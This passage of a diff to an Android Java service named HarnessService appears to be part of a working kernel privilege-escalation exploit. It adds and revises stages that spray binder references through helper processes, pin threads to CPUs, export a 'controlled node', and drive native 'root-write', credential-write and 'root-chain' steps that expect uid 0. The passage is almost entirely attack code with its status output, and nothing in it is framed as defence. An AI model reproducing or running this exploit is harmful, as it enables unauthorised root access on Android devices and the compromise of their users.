+                        getFilesDir().getAbsolutePath());
+                checkpoint(arm.startsWith("status=pass")
+                        ? "root-write-" + logicalWrite + "-armed"
+                        : "root-write-" + logicalWrite + "-arm-failed");
+                if (!arm.startsWith("status=pass")) {
+                    writes.append(" arm").append(logicalWrite).append("=[")
+                            .append(arm).append("]");
+                    if (directCredentialWrite && arm.contains(
+                            "stage=null-write-prepare reason=preflight")) {
+                        internalWriteMisses++;
+                        checkpoint("root-write-" + logicalWrite +
+                                "-preflight-retry-ready");
+                        continue;
+                    }
+                    pass = false;
+                    break;
                 }
-                pass = false;
-                break;
             }
             String completed = completeIndexedUnlink(victim, target);
             checkpoint(completed.startsWith("status=pass")
@@ -2756,7 +3711,8 @@ public final class HarnessService extends Service {
                     .append("_victim").append(victim).append("=[")
                     .append(completed).append("]");
             if (!completed.startsWith("status=pass")) {
-                boolean safeRetry = directCredentialWrite &&
+                boolean safeRetry = !batchedTerminalWrites &&
+                        directCredentialWrite &&
                         completed.contains("safe_no_free=1");
                 if (safeRetry) {
                     internalWriteMisses++;
@@ -2780,7 +3736,7 @@ public final class HarnessService extends Service {
                 }
                 if (directSecurityRepair &&
                         writeStep == (directTerminalCleanup
-                                ? 4 : directWriteCount)) {
+                                ? 2 : directWriteCount)) {
                     checkpoint("root-watchdog-arm-ready");
                     File watchdogArm = new File(
                             getFilesDir(), "root-watchdog-arm.done");
@@ -2792,7 +3748,20 @@ public final class HarnessService extends Service {
                     }
                     checkpoint("root-watchdog-arm-pass");
                 }
-                writeStep++;
+                if (directTerminalCleanup && writeStep == 2) {
+                    String skippedRealCred =
+                            NativeBridge.skipDirectRealCredWrites();
+                    writes.append(" real_cred_skip=[")
+                            .append(skippedRealCred).append("]");
+                    if (!skippedRealCred.startsWith("status=pass")) {
+                        pass = false;
+                        break;
+                    }
+                    checkpoint("root-real-cred-skip-pass");
+                    writeStep = 5;
+                } else {
+                    writeStep++;
+                }
             }
             if (directCredQuarantine &&
                     directCredentialWrite && writeStep == 6) {
@@ -2856,6 +3825,11 @@ public final class HarnessService extends Service {
             if (directActionAfterSecuritySwap && !actionCompleted &&
                     directTerminalCleanup && directCredentialWrite &&
                     writeStep == 7) {
+                rescuePlanPrepared = prepareTerminalCtlbufRescuePlan(writes);
+                if (!rescuePlanPrepared) {
+                    pass = false;
+                    break;
+                }
                 checkpoint("root-window-security-ready");
                 File actionDone = new File(
                         getFilesDir(), "root-action-security.done");
@@ -2871,20 +3845,11 @@ public final class HarnessService extends Service {
             }
             if (directTerminalCleanup && directCredentialWrite &&
                     actionCompleted && writeStep == 7) {
-                String rescuePlan =
-                        NativeBridge.terminalCtlbufRescuePlan(
-                                rootWatchdogNonce);
-                writePrivateAtomic("ctlbuf-rescue-plan.result", rescuePlan);
-                writes.append(" ctlbuf_rescue_plan=[")
-                        .append(rescuePlan).append("]");
-                if (!rescuePlan.startsWith(
-                        "status=pass stage=ctlbuf-rescue-plan ")) {
-                    checkpoint("ctlbuf-rescue-plan-failed");
+                if (!rescuePlanPrepared &&
+                        !prepareTerminalCtlbufRescuePlan(writes)) {
                     pass = false;
                     break;
                 }
-                writePrivateAtomic("ctlbuf-rescue.plan", rescuePlan);
-                checkpoint("ctlbuf-rescue-plan-ready");
                 checkpoint("helper-normalisation-arm-ready");
                 File normalised = new File(
                         getFilesDir(), "helper-normalised.done");
@@ -2989,7 +3954,6 @@ public final class HarnessService extends Service {
                     throw exception;
                 }
                 requiredCheckpoint("native-terminal-cleanup-start");
-                Thread.sleep(1000);
                 String cleanup = NativeBridge.completeTerminalCleanup(
                         getFilesDir().getAbsolutePath());
                 writes.append(" terminal_cleanup=[")
@@ -3022,13 +3986,13 @@ public final class HarnessService extends Service {
             checkpoint("root-write-incomplete");
             pass = false;
         }
-        return "status=" + (pass ? "pass" : "miss") +
+        String rootUnlink = "status=" + (pass ? "pass" : "miss") +
                 " stage=root-unlink uid_expected=0 handle=[" +
                 handleState + "] decrement=[" + decrement +
                 "] refs=[" + refs + "] analysis=[" + analysis +
                 "] clients=[" + clients +
                 "] client_exit=[" + clientExit + "]" + extraExits +
-                victimCaches + " target_cache=[" +
+                " cache=[" + victimCaches + "] target_cache=[" +
                 credentialTargetState + "] target=[" +
                 credentialTarget + "] prepare=[" +
                 prepare + "] first=[" + first +
@@ -3036,6 +4000,10 @@ public final class HarnessService extends Service {
                 "] security=[" +
                 securityTarget + "] internal_write_misses=" +
                 internalWriteMisses + writes;
+        return mutate
+                ? "status=" + (pass ? "pass" : "miss") +
+                        " stage=root-chain node=[" + rootUnlink + "]"
+                : rootUnlink;
     }
 
     private boolean signalBootCopy() {
@@ -3371,6 +4339,624 @@ public final class HarnessService extends Service {
         }
     }
 
+    private String prepareRawBinderHolders() {
+        synchronized (rawBinderHolderEndpoints) {
+            if (!rawBinderHolderEndpoints.isEmpty()) {
+                return "status=fail stage=raw-binder-holder-bootstrap" +
+                        " reason=stale-endpoints count=" +
+                        rawBinderHolderEndpoints.size();
+            }
+            rawBinderHolderEndpoints.addAll(Collections.nCopies(
+                    RAW_BINDER_HOLDER_COUNT, null));
+        }
+        Parcel serviceManager = Parcel.obtain();
+        Binder callbackMarker = new Binder();
+        Parcel startService = Parcel.obtain();
+        String serviceExport = "status=fail stage=parcel-template-export" +
+                " reason=not-run";
+        String startExport = serviceExport;
+        String routes = "status=fail stage=raw-binder-holder-routes" +
+                " reason=not-run";
+        long started = SystemClock.elapsedRealtimeNanos();
+        try {
+            serviceManager.writeInterfaceToken("android.os.IServiceManager");
+            serviceManager.writeString("activity");
+            Intent broker = new Intent(this, HarnessService.class);
+            broker.putExtra("stage", "raw-binder-broker");
+            broker.putExtra(RAW_BROKER_HOLDER_EXTRA, true);
+            broker.putExtra(RAW_BROKER_HOLDER_INDEX_EXTRA,
+                    RAW_BROKER_HOLDER_INDEX_SENTINEL);
+            android.os.Bundle extras = broker.getExtras();
+            if (extras == null) {
+                extras = new android.os.Bundle();
+            }
+            extras.putBinder(RAW_BROKER_CALLBACK_EXTRA, callbackMarker);
+            broker.replaceExtras(extras);
+            startService.writeInterfaceToken("android.app.IActivityManager");
+            startService.writeStrongBinder(null);
+            startService.writeTypedObject(broker, 0);
+            startService.writeString(null);
+            startService.writeBoolean(false);
+            startService.writeString(getPackageName());
+            startService.writeString(null);
+            startService.writeInt(Process.myUid() / 100000);
+            File serviceTemplate = new File(getFilesDir(),
+                    "raw-route-holder-service.template");
+            File startTemplate = new File(getFilesDir(),
+                    "raw-route-holder-start.template");
+            serviceExport = NativeBridge.exportParcelTemplate(
+                    serviceManager, serviceTemplate.getPath());
+            startExport = NativeBridge.exportParcelTemplate(
+                    startService, startTemplate.getPath());
+            if (serviceExport.startsWith("status=pass") &&
+                    startExport.startsWith("status=pass")) {
+                routes = NativeBridge.startRawBinderHolderRoutes(
+                        serviceTemplate.getPath(), startTemplate.getPath(),
+                        RAW_BINDER_HOLDER_COUNT,
+                        RAW_BROKER_HOLDER_INDEX_SENTINEL);
+            }
+        } finally {
+            startService.recycle();
+            serviceManager.recycle();
+        }
+        int endpoints;
+        synchronized (rawBinderHolderEndpoints) {
+            endpoints = 0;
+            for (RawBinderHolderEndpoint endpoint :
+                    rawBinderHolderEndpoints) {
+                endpoints += endpoint == null ? 0 : 1;
+            }
+        }
+        boolean pass = endpoints == RAW_BINDER_HOLDER_COUNT &&
+                routes.startsWith("status=pass");
+        rawBinderHoldersActive = pass;
+        if (!pass) {
+            synchronized (rawBinderHolderEndpoints) {
+                for (RawBinderHolderEndpoint endpoint :
+                        rawBinderHolderEndpoints) {
+                    if (endpoint != null && endpoint.deathBarrier != 0) {
+                        NativeBridge.discardBinderDeathBarrier(
+                                endpoint.deathBarrier);
+                        endpoint.deathBarrier = 0;
+                    }
+                }
+                rawBinderHolderEndpoints.clear();
+            }
+            if (routes.startsWith("status=pass")) {
+                NativeBridge.releaseRawBinderRouteProbes();
+            }
+        }
+        long durationMicros = (SystemClock.elapsedRealtimeNanos() -
+                started) / 1000;
+        return "status=" + (pass ? "pass" : "fail") +
+                " stage=raw-binder-holder-bootstrap requested=" +
+                RAW_BINDER_HOLDER_COUNT + " prepared=" + endpoints +
+                " endpoints=" + endpoints + " duration_us=" +
+                durationMicros + " routes=[" + routes +
+                "] service=[" + serviceExport + "] start=[" +
+                startExport + "]";
+    }
+
+    private String primeRawBinderHolders() {
+        List<RawBinderHolderEndpoint> endpoints;
+        synchronized (rawBinderHolderEndpoints) {
+            endpoints = new ArrayList<>(rawBinderHolderEndpoints);
+        }
+        if (!rawBinderHoldersActive || endpoints.size() !=
+                RAW_BINDER_HOLDER_COUNT || rawBinderPrimeNodes != null) {
+            return "status=fail stage=raw-binder-holder-prime" +
+                    " reason=preflight endpoints=" + endpoints.size();
+        }
+        int totalRefs = RAW_BINDER_HOLDER_COUNT *
+                RAW_BINDER_PRIME_REFS_PER_HOLDER;
+        IBinder[] primeNodes = new IBinder[totalRefs];
+        for (int index = 0; index < primeNodes.length; index++) {
+            primeNodes[index] = new Binder();
+        }
+        rawBinderPrimeNodes = primeNodes;
+        int cpu = NativeBridge.pinCurrentThread(2);
+        FutureTask<String> receiver = new FutureTask<>(() ->
+                NativeBridge.receiveRawBinderHolderRefs(
+                        RAW_BINDER_HOLDER_COUNT,
+                        RAW_BINDER_PRIME_REFS_PER_HOLDER,
+                        RAW_BROKER_PRIME_PROOF, -1));
+        Thread receiverThread = new Thread(receiver,
+                "raw-binder-prime-receiver");
+        receiverThread.start();
+        int submitted = 0;
+        for (int holder = 0; holder < endpoints.size(); holder++) {
+            Parcel data = Parcel.obtain();
+            Parcel reply = Parcel.obtain();
+            try {
+                data.writeInt(RAW_BROKER_PRIME_PROOF);
+                data.writeInt(RAW_BINDER_PRIME_REFS_PER_HOLDER);
+                int first = holder * RAW_BINDER_PRIME_REFS_PER_HOLDER;
+                for (int index = 0;
+                     index < RAW_BINDER_PRIME_REFS_PER_HOLDER; index++) {
+                    data.writeStrongBinder(primeNodes[first + index]);
+                }
+                if (!endpoints.get(holder).callback.transact(
+                        RAW_BROKER_HOLDER_CODE, data, reply, 0)) {
+                    break;
+                }
+                reply.readException();
+                if (reply.readInt() != RAW_BROKER_PRIME_PROOF) {
+                    break;
+                }
+                submitted++;
+            } catch (RemoteException exception) {
+                break;
+            } finally {
+                reply.recycle();
+                data.recycle();
+            }
+        }
+        String received;
+        try {
+            received = receiver.get(6, TimeUnit.SECONDS);
+        } catch (InterruptedException exception) {
+            Thread.currentThread().interrupt();
+            received = "status=fail stage=raw-binder-holder-refs" +
+                    " reason=interrupted";
+        } catch (ExecutionException | TimeoutException exception) {
+            received = "status=fail stage=raw-binder-holder-refs" +
+                    " reason=receiver type=" +
+                    exception.getClass().getSimpleName();
+        }
+        boolean pass = cpu == 2 && submitted == RAW_BINDER_HOLDER_COUNT &&
+                received.startsWith("status=pass");
+        return "status=" + (pass ? "pass" : "fail") +
+                " stage=raw-binder-holder-prime submitted=" + submitted +
+                " refs=" + totalRefs + " cpu=" + cpu +
+                " received=[" + received + "]";
+    }
+
+    private String retainRawBinderHolderRefs() {
+        return retainRawBinderHolderRefs(false);
+    }
+
+    private String retainRawBinderHolderRefs(boolean compact) {
+        List<RawBinderHolderEndpoint> endpoints;
+        synchronized (rawBinderHolderEndpoints) {
+            endpoints = new ArrayList<>(rawBinderHolderEndpoints);
+        }
+        if (!rawBinderHoldersActive || endpoints.size() !=
+                    RAW_BINDER_HOLDER_COUNT || fillerNodes == null ||
+                controlledNode == null) {
+            return "status=fail stage=raw-binder-holder-send" +
+                    " reason=preflight endpoints=" + endpoints.size();
+        }
+        int cpu = NativeBridge.pinCurrentThread(2);
+        int fixedRefs = compact ? 1 : 0;
+        FutureTask<String> receiver = new FutureTask<>(() ->
+                NativeBridge.receiveRawBinderHolderRefs(
+                        RAW_BINDER_HOLDER_COUNT, fixedRefs,
+                        RAW_BROKER_HOLDER_PROOF, -1));
+        Thread receiverThread = new Thread(receiver,
+                "raw-binder-holder-receiver");
+        receiverThread.start();
+        int submitted = 0;
+        StringBuilder mixedInterleave = new StringBuilder();
+        for (int holder = 0; holder < endpoints.size(); holder++) {
+            Parcel data = Parcel.obtain();
+            Parcel reply = Parcel.obtain();
+            try {
+                int rawFillers = compact ? 0 :
+                        RAW_BINDER_FILLER_MIN + holder /
+                                (RAW_BINDER_HOLDER_COUNT /
+                                        RAW_BINDER_FILLER_VARIANTS);
+                data.writeInt(RAW_BROKER_HOLDER_PROOF);
+                data.writeInt(rawFillers + 1);
+                if (compact) {
+                    data.writeStrongBinder(controlledNode);
+                }
+                int first = holder * FILLERS_PER_PROCESS;
+                for (int filler = 0; filler < rawFillers; filler++) {
+                    data.writeStrongBinder(fillerNodes[
+                            (first + filler) % fillerNodes.length]);
+                }
+                if (!compact) {
+                    data.writeStrongBinder(controlledNode);
+                }
+                if (!endpoints.get(holder).callback.transact(
+                        RAW_BROKER_HOLDER_CODE, data, reply, 0)) {
+                    break;
+                }
+                reply.readException();
+                if (reply.readInt() != RAW_BROKER_HOLDER_PROOF) {
+                    break;
+                }
+                submitted++;
+                String interleave = extendMixedEpitemsForHolderCount(
+                        submitted);
+                if (!interleave.isEmpty()) {
+                    mixedInterleave.append(" [").append(interleave)
+                            .append("]");
+                    if (!interleave.startsWith("status=pass")) {
+                        break;
+                    }
+                }
+            } catch (RemoteException exception) {
+                break;
+            } finally {
+                reply.recycle();
+                data.recycle();
+            }
+        }
+        String received;
+        try {
+            received = receiver.get(6, TimeUnit.SECONDS);
+        } catch (InterruptedException exception) {
+            Thread.currentThread().interrupt();
+            received = "status=fail stage=raw-binder-holder-refs" +
+                    " reason=interrupted";
+        } catch (ExecutionException | TimeoutException exception) {
+            received = "status=fail stage=raw-binder-holder-refs" +
+                    " reason=receiver type=" +
+                    exception.getClass().getSimpleName();
+        }
+        boolean pass = cpu == 2 && submitted == RAW_BINDER_HOLDER_COUNT &&
+                received.startsWith("status=pass") &&
+                mixedInterleave.indexOf("status=fail") < 0;
+        return "status=" + (pass ? "pass" : "fail") +
+                " stage=raw-binder-ref-spray mode=synchronous" +
+                " submitted=" + submitted +
+                " filler_range=" + (compact ? "0-0" :
+                        RAW_BINDER_FILLER_MIN + "-" +
+                                (RAW_BINDER_FILLER_MIN +
+                                        RAW_BINDER_FILLER_VARIANTS - 1)) +
+                " cpu=" + cpu + " interleave=" + mixedInterleave +
+                " received=[" + received + "]";
+    }
+
+    private String retainRawRootBinderHolderRefs() {
+        return retainRawRootBinderHolderRefs(false);
+    }
+
+    private String retainRawRootBinderHolderRefs(boolean compact) {
+        List<RawBinderHolderEndpoint> endpoints;
+        synchronized (rawBinderHolderEndpoints) {
+            endpoints = new ArrayList<>(rawBinderHolderEndpoints);
+        }
+        Parcel nodeTemplate = rawControlledNodeParcel;
+        if (!rawBinderHoldersActive || endpoints.size() !=
+                    RAW_BINDER_HOLDER_COUNT ||
+                (!compact && fillerNodes == null) ||
+                nodeTemplate == null || nodeTemplate.dataSize() <= 0) {
+            return "status=fail stage=raw-root-binder-holder-send" +
+                    " reason=preflight endpoints=" + endpoints.size();
+        }
+        int cpu = NativeBridge.pinCurrentThread(2);
+        int fixedRefs = compact ? -1 : 0;
+        FutureTask<String> receiver = new FutureTask<>(() ->
+                NativeBridge.receiveRawBinderHolderRefs(
+                        RAW_BINDER_HOLDER_COUNT, fixedRefs,
+                        RAW_BROKER_HOLDER_PROOF, compact ? -1 : -2));
+        Thread receiverThread = new Thread(receiver,
+                "raw-root-binder-holder-receiver");
+        receiverThread.start();
+        int submitted = 0;
+        StringBuilder mixedInterleave = new StringBuilder();
+        for (int holder = 0; holder < endpoints.size(); holder++) {
+            Parcel data = Parcel.obtain();
+            Parcel reply = Parcel.obtain();
+            try {
+                int rawFillers = compact ? 0 :
+                        RAW_BINDER_FILLER_MIN + holder /
+                                (RAW_BINDER_HOLDER_COUNT /
+                                        RAW_BINDER_FILLER_VARIANTS);
+                data.writeInt(RAW_BROKER_HOLDER_PROOF);
+                boolean markerRoute = compact && holder %
+                        (RAW_BINDER_HOLDER_COUNT /
+                                RAW_CURRENT_PROC_MARKER_HOLDERS) == 0;
+                data.writeInt(rawFillers + (compact
+                        ? markerRoute ? 2 : 1 : 2));
+                if (compact) {
+                    data.appendFrom(nodeTemplate, 0,
+                            nodeTemplate.dataSize());
+                    if (markerRoute) {
+                        data.setDataPosition(data.dataSize());
+                        data.writeStrongBinder(rawCurrentProcMarker);
+                    }
+                }
+                int first = holder * FILLERS_PER_PROCESS;
+                for (int filler = 0; filler < rawFillers; filler++) {
+                    data.writeStrongBinder(fillerNodes[
+                            (first + filler) % fillerNodes.length]);
+                }
+                if (!compact) {
+                    data.appendFrom(nodeTemplate, 0,
+                            nodeTemplate.dataSize());
+                }
+                if (!compact) {
+                    data.writeStrongBinder(kernelAnchor);
+                }
+                if (!endpoints.get(holder).callback.transact(
+                        RAW_BROKER_HOLDER_CODE, data, reply, 0)) {
+                    break;
+                }
+                reply.readException();
+                if (reply.readInt() != RAW_BROKER_HOLDER_PROOF) {
+                    break;
+                }
+                submitted++;
+                String interleave = extendMixedEpitemsForHolderCount(
+                        submitted);
+                if (!interleave.isEmpty()) {
+                    mixedInterleave.append(" [").append(interleave)
+                            .append("]");
+                    if (!interleave.startsWith("status=pass")) {
+                        break;
+                    }
+                }
+            } catch (RemoteException exception) {
+                break;
+            } finally {
+                reply.recycle();
+                data.recycle();
+            }
+        }
+        String received;
+        try {
+            received = receiver.get(6, TimeUnit.SECONDS);
+        } catch (InterruptedException exception) {
+            Thread.currentThread().interrupt();
+            received = "status=fail stage=raw-binder-holder-refs" +
+                    " reason=interrupted";
+        } catch (ExecutionException | TimeoutException exception) {
+            received = "status=fail stage=raw-binder-holder-refs" +
+                    " reason=receiver type=" +
+                    exception.getClass().getSimpleName();
+        }
+        rawControlledNodeParcel = null;
+        nodeTemplate.recycle();
+        boolean pass = cpu == 2 && submitted == RAW_BINDER_HOLDER_COUNT &&
+                received.startsWith("status=pass") &&
+                mixedInterleave.indexOf("status=fail") < 0;
+        rawCurrentProcMarkerRetained = pass && compact
+                ? RAW_CURRENT_PROC_MARKER_HOLDERS : 0;
+        kernelAnchorRetained = pass && !compact
+                ? RAW_BINDER_HOLDER_COUNT : 0;
+        return "status=" + (pass ? "pass" : "fail") +
+                " stage=raw-root-binder-ref-spray mode=synchronous" +
+                " submitted=" + submitted +
+                " filler_range=" + (compact ? "0-0" :
+                        RAW_BINDER_FILLER_MIN + "-" +
+                                (RAW_BINDER_FILLER_MIN +
+                                        RAW_BINDER_FILLER_VARIANTS - 1)) +
+                " anchors=" + kernelAnchorRetained +
+                " current_proc_markers=" +
+                rawCurrentProcMarkerRetained +
+                " proxy_materialised=0 template_released=1" +
+                " cpu=" + cpu + " interleave=" + mixedInterleave +
+                " received=[" + received + "]";
+    }
+
+    private String retainRawRootKernelAnchorPhase() {
+        List<RawBinderHolderEndpoint> endpoints;
+        synchronized (rawBinderHolderEndpoints) {
+            endpoints = new ArrayList<>(rawBinderHolderEndpoints);
+        }
+        if (!rawBinderHoldersActive || endpoints.size() !=
+                RAW_BINDER_HOLDER_COUNT || kernelAnchor == null) {
+            return "status=fail stage=raw-root-anchor-phase" +
+                    " reason=preflight endpoints=" + endpoints.size();
+        }
+        int cpu = NativeBridge.pinCurrentThread(2);
+        String phase = runRawBinderHolderPhase(
+                endpoints, 1, -1, "raw-root-anchor-receiver",
+                (parcel, holder) ->
+                        parcel.writeStrongBinder(kernelAnchor));
+        boolean pass = cpu == 2 && phase.startsWith("status=pass");
+        kernelAnchorRetained = pass ? RAW_BINDER_HOLDER_COUNT : 0;
+        return "status=" + (pass ? "pass" : "fail") +
+                " stage=raw-root-anchor-phase retained=" +
+                kernelAnchorRetained + " cpu=" + cpu + " phase=[" +
+                phase + "]";
+    }
+
+    private String retainRawCurrentProcMarkerPhase() {
+        boolean pass = rawCurrentProcMarkerRetained ==
+                RAW_CURRENT_PROC_MARKER_HOLDERS;
+        return "status=" + (pass ? "pass" : "fail") +
+                " stage=raw-current-proc-marker mode=interleaved" +
+                " retained=" + rawCurrentProcMarkerRetained +
+                " expected=" + RAW_CURRENT_PROC_MARKER_HOLDERS;
+    }
+
+    @FunctionalInterface
+    private interface RawHolderPhaseWriter {
+        void write(Parcel parcel, int holder);
+    }
+
+    private String runRawBinderHolderPhase(
+            List<RawBinderHolderEndpoint> endpoints, int objectCount,
+            int deathObjectIndex, String threadName,
+            RawHolderPhaseWriter writer) {
+        return runRawBinderHolderPhase(
+                endpoints, endpoints.size(), objectCount,
+                deathObjectIndex, threadName, writer);
+    }
+
+    private String runRawBinderHolderPhase(
+            List<RawBinderHolderEndpoint> endpoints, int holderCount,
+            int objectCount, int deathObjectIndex, String threadName,
+            RawHolderPhaseWriter writer) {
+        FutureTask<String> receiver = new FutureTask<>(() ->
+                NativeBridge.receiveRawBinderHolderRefs(
+                        holderCount, objectCount,
+                        RAW_BROKER_HOLDER_PROOF, deathObjectIndex));
+        Thread receiverThread = new Thread(receiver, threadName);
+        receiverThread.start();
+        int submitted = 0;
+        for (int holder = 0; holder < holderCount; holder++) {
+            Parcel data = Parcel.obtain();
+            Parcel reply = Parcel.obtain();
+            try {
+                data.writeInt(RAW_BROKER_HOLDER_PROOF);
+                data.writeInt(objectCount);
+                writer.write(data, holder);
+                if (!endpoints.get(holder).callback.transact(
+                        RAW_BROKER_HOLDER_CODE, data, reply, 0)) {
+                    break;
+                }
+                reply.readException();
+                if (reply.readInt() != RAW_BROKER_HOLDER_PROOF) {
+                    break;
+                }
+                submitted++;
+            } catch (RemoteException exception) {
+                break;
+            } finally {
+                reply.recycle();
+                data.recycle();
+            }
+        }
+        String received;
+        try {
+            received = receiver.get(6, TimeUnit.SECONDS);
+        } catch (InterruptedException exception) {
+            Thread.currentThread().interrupt();
+            received = "status=fail stage=raw-binder-holder-refs" +
+                    " reason=interrupted";
+        } catch (ExecutionException | TimeoutException exception) {
+            received = "status=fail stage=raw-binder-holder-refs" +
+                    " reason=receiver type=" +
+                    exception.getClass().getSimpleName();
+        }
+        boolean pass = holderCount > 0 && holderCount <= endpoints.size() &&
+                submitted == holderCount &&
+                received.startsWith("status=pass");
+        return "status=" + (pass ? "pass" : "fail") +
+                " stage=raw-binder-holder-phase objects=" + objectCount +
+                " requested=" + holderCount + " submitted=" + submitted +
+                " received=[" +
+                received + "]";
+    }
+
+    private String retainCompactRawBinderHolderRefs(
+            List<RawBinderHolderEndpoint> endpoints) {
+        int cpu = NativeBridge.pinCurrentThread(2);
+        String fillers = runRawBinderHolderPhase(
+                endpoints, 8, -1, "raw-binder-filler-receiver",
+                (parcel, holder) -> {
+                    int first = holder * FILLERS_PER_PROCESS;
+                    for (int filler = 0; filler < 8; filler++) {
+                        parcel.writeStrongBinder(fillerNodes[
+                                (first + filler) % fillerNodes.length]);
+                    }
+                });
+        String controlled = fillers.startsWith("status=pass")
+                ? runRawBinderHolderPhase(
+                        endpoints, 1, -1,
+                        "raw-binder-controlled-receiver",
+                        (parcel, holder) ->
+                                parcel.writeStrongBinder(controlledNode))
+                : "status=fail stage=raw-binder-holder-phase" +
+                        " reason=fillers";
+        boolean pass = cpu == 2 && fillers.startsWith("status=pass") &&
+                controlled.startsWith("status=pass");
+        return "status=" + (pass ? "pass" : "fail") +
+                " stage=raw-binder-ref-spray mode=compact-phased" +
+                " filler_range=8-8 cpu=" + cpu + " fillers=[" +
+                fillers + "] controlled=[" + controlled + "]";
+    }
+
+    private String retainCompactRawRootBinderHolderRefs(
+            List<RawBinderHolderEndpoint> endpoints, Parcel nodeTemplate) {
+        int cpu = NativeBridge.pinCurrentThread(2);
+        String fillers = runRawBinderHolderPhase(
+                endpoints, 8, -1, "raw-root-binder-filler-receiver",
+                (parcel, holder) -> {
+                    int first = holder * FILLERS_PER_PROCESS;
+                    for (int filler = 0; filler < 8; filler++) {
+                        parcel.writeStrongBinder(fillerNodes[
+                                (first + filler) % fillerNodes.length]);
+                    }
+                });
+        String controlled = fillers.startsWith("status=pass")
+                ? runRawBinderHolderPhase(
+                        endpoints, 2, -2,
+                        "raw-root-binder-controlled-receiver",
+                        (parcel, holder) -> {
+                            parcel.appendFrom(nodeTemplate, 0,
+                                    nodeTemplate.dataSize());
+                            parcel.writeStrongBinder(kernelAnchor);
+                        })
+                : "status=fail stage=raw-binder-holder-phase" +
+                        " reason=fillers";
+        rawControlledNodeParcel = null;
+        nodeTemplate.recycle();
+        boolean pass = cpu == 2 && fillers.startsWith("status=pass") &&
+                controlled.startsWith("status=pass");
+        kernelAnchorRetained = pass ? RAW_BINDER_HOLDER_COUNT : 0;
+        return "status=" + (pass ? "pass" : "fail") +
+                " stage=raw-root-binder-ref-spray mode=compact-phased" +
+                " filler_range=8-8 anchors=" + kernelAnchorRetained +
+                " proxy_materialised=0 template_released=1 cpu=" + cpu +
+                " fillers=[" + fillers + "] controlled=[" +
+                controlled + "]";
+    }
+
+    private String extendMixedEpitemsForHolderCount(int submitted) {
+        return "";
+    }
+
+    private String releaseRawBinderHolders() {
+        List<RawBinderHolderEndpoint> endpoints;
+        synchronized (rawBinderHolderEndpoints) {
+            endpoints = new ArrayList<>(rawBinderHolderEndpoints);
+        }
+        if (!rawBinderHoldersActive && endpoints.isEmpty()) {
+            return "status=pass stage=raw-binder-holder-release skipped=1";
+        }
+        int releaseCpu = NativeBridge.pinCurrentThread(0);
+        String nativeRelease = NativeBridge.releaseRawBinderRouteProbes();
+        long deadline = SystemClock.elapsedRealtime() +
+                TERMINAL_RETIREMENT_TIMEOUT_MS;
+        int deaths = 0;
+        for (RawBinderHolderEndpoint endpoint : endpoints) {
+            long remaining = deadline - SystemClock.elapsedRealtime();
+            String death = NativeBridge.awaitBinderDeathBarrier(
+                    endpoint.deathBarrier,
+                    (int) Math.max(1, Math.min(Integer.MAX_VALUE,
+                            remaining)));
+            endpoint.deathBarrier = 0;
+            if (death.startsWith("status=pass")) {
+                deaths++;
+            }
+        }
+        synchronized (rawBinderHolderEndpoints) {
+            rawBinderHolderEndpoints.clear();
+        }
+        String retirementProof = isRootFlow() &&
+                nativeRelease.startsWith("status=pass") &&
+                deaths == endpoints.size()
+                ? NativeBridge.proveRawBinderHoldersRetired(
+                        isolatedRetirementGeneration,
+                        endpoints.size(), deaths)
+                : "status=pass stage=raw-holder-retirement-proof" +
+                        " skipped=1";
+        rawBinderHoldersActive = false;
+        rawBinderPrimeNodes = null;
+        if (rawControlledNodeParcel != null) {
+            rawControlledNodeParcel.recycle();
+            rawControlledNodeParcel = null;
+        }
+        int restoredCpu = NativeBridge.pinCurrentThread(2);
+        boolean pass = releaseCpu == 0 && restoredCpu == 2 &&
+                nativeRelease.startsWith("status=pass") &&
+                deaths == endpoints.size() &&
+                retirementProof.startsWith("status=pass");
+        return "status=" + (pass ? "pass" : "fail") +
+                " stage=raw-binder-holder-release endpoints=" +
+                endpoints.size() + " deaths=" + deaths +
+                " release_cpu=" + releaseCpu +
+                " restored_cpu=" + restoredCpu +
+                " proof=[" + retirementProof + "]" +
+                " native=[" + nativeRelease + "]";
+    }
+
     private void queueControlledNode() throws Exception {
         Parcel data = Parcel.obtain();
         try {
@@ -3387,6 +4973,7 @@ public final class HarnessService extends Service {
     private String exportRawControlledNode() {
         Parcel data = Parcel.obtain();
         Parcel reply = Parcel.obtain();
+        Parcel candidateNode = null;
         try {
             IBinder service;
             ProcessIdentity identity;
@@ -3406,7 +4993,7 @@ public final class HarnessService extends Service {
             rawControlledPointer = reply.readLong();
             rawControlledCookie = reply.readLong();
             int siblingCount = reply.readInt();
-            int expectedSiblings = "root-chain".equals(requestedStage)
+            int expectedSiblings = useMixedDisclosure()
                     ? RawBClientService.RAW_COHORT_COUNT - 1 : 0;
             if (siblingCount != expectedSiblings) {
                 return "status=fail stage=raw-controlled-export " +
@@ -3422,6 +5009,25 @@ public final class HarnessService extends Service {
                     return "status=fail stage=raw-controlled-export " +
                             "reason=cohort-sibling index=" + index;
                 }
+            }
+            int nodeOffset = reply.dataPosition();
+            int nodeLength = reply.dataAvail();
+            if (nodeLength <= 0) {
+                return "status=fail stage=raw-controlled-export " +
+                        "reason=node-template-empty";
+            }
+            candidateNode = Parcel.obtain();
+            candidateNode.appendFrom(reply, nodeOffset, nodeLength);
+            Parcel inspection = Parcel.obtain();
+            String nodeState;
+            try {
+                inspection.writeInt(RAW_BROKER_ROOT_PROOF);
+                inspection.appendFrom(candidateNode, 0,
+                        candidateNode.dataSize());
+                nodeState = NativeBridge.inspectRemoteBinderParcel(
+                        inspection);
+            } finally {
+                inspection.recycle();
             }
             String cohortState = siblingCount == 0
                     ? "status=pass stage=raw-cohort-validate skipped=1"
@@ -3439,10 +5045,12 @@ public final class HarnessService extends Service {
                     exportedPid != identity.pid ||
                     rawControlledPointer == 0 ||
                     rawControlledCookie == 0 ||
+                    !nodeState.startsWith("status=pass") ||
                     !cohortState.startsWith("status=pass") ||
                     !ownerState.startsWith("status=pass")) {
                 return "status=fail stage=raw-controlled-export " +
                         "reason=payload client=[" + state +
+                        "] node=[" + nodeState +
                         "] cohort=[" + cohortState + "] owner=[" +
                         ownerState + "]";
             }
@@ -3454,15 +5062,23 @@ public final class HarnessService extends Service {
                             "reason=client-changed";
                 }
                 rawClientPid = exportedPid;
+                if (rawControlledNodeParcel != null) {
+                    rawControlledNodeParcel.recycle();
+                }
+                rawControlledNodeParcel = candidateNode;
+                candidateNode = null;
             }
             rawCohortSiblings = siblingCount == 0 ? null : siblings;
             return state + " siblings=" + siblingCount +
                     " cohort=[" + cohortState + "] owner=[" +
-                    ownerState + "]";
+                    ownerState + "] node=[" + nodeState + "]";
         } catch (Exception exception) {
             return "status=fail stage=raw-controlled-export reason=" +
